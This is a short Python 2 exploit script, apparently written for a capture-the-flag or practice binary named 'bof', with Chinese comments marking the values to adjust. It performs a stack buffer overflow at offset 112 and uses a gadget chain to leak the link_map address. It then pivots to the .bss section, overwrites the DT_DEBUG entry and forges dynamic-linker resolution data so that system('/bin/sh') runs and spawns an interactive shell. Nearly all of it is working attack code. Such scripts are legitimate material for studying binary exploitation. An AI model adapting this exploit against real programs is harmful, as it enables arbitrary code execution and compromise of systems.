#!/usr/bin/python
#coding:utf-8
import roputils
from pwn import *
#context.log_level = 'debug'

fpath = './bof'        #需要修改的地方：文件名、溢出偏移; 读取偏移0x100->  ?? ; gadget地址
offset = 112

rop = roputils.ROP(fpath)
addr_stage = rop.section('.bss') + 0x400
ptr_ret = rop.search(rop.section('.fini'))

main_addr=0x400676
pop6_addr=0x4007AA
call_addr=0x400790
write_got=0x601018
got_8=0x601008
buf = rop.retfill(offset)
buf += 'a'*8
buf += p64(pop6_addr)+p64(0)+p64(1)+p64(write_got)+p64(8)+p64(got_8)+p64(1)+p64(call_addr)
buf += p64(0)*7
buf += p64(main_addr)
buf =  buf.ljust(0x100,'\x00')    #1.泄露&link_map地址，读取偏移0x100有待修改

p = process(fpath)
print p.recv()
p.send(buf)
addr_link_map = u64(p.recv(8))


buf = rop.retfill(offset)         #2.往bss段写入ROP链和伪造的结构
buf += 'a'*8
buf += rop.call_chain_ptr(
    #['write', 1, rop.got()+8, 8],
    ['read', 0, addr_stage, 500]   #400
, pivot=addr_stage)
buf=buf.ljust(0x100,'\x00')
p.send(buf)

#gdb.attach(p,'b *0x4006ab')
addr_dt_debug = addr_link_map + 0x1c8     #3.bss段的rop作用:往link_map+0x1c8写0; 同时往bss段写入伪造结构。
buf = rop.call_chain_ptr(
    ['read', 0, addr_dt_debug, 8],
    [ptr_ret, addr_stage+450]  #380
)
buf += rop.dl_resolve_call(addr_stage+300)
buf =  buf.ljust(300,'\x00')
buf += rop.dl_resolve_data(addr_stage+300, 'system')
buf =  buf.ljust(450,'\x00')   #380
buf += rop.string('/bin/sh')
buf =  buf.ljust(500,'\x00')

p.send(buf)
p.send(p64(0))      #写0
p.interactive()

'''
#for i in range(len(buf)/8):
#	print hex(u64(buf[8*i:8*(i+1)]))
#raw_input('wait!\n')
'''
